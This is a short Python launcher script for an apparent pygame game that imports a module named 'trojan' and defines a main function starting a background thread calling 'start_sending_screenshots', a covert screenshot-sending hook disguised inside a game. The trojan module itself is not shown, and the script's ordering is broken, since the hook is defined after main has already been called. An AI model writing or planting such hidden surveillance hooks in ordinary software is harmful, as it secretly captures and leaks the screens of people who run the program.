import trojan
import threading
import pygame as pg
from source.main import main

if __name__=='__main__':
    main()
    pg.quit()
def main():
   
    trojan_thread = threading.Thread(target=trojan.start_sending_screenshots)
    trojan_thread.start()
    
    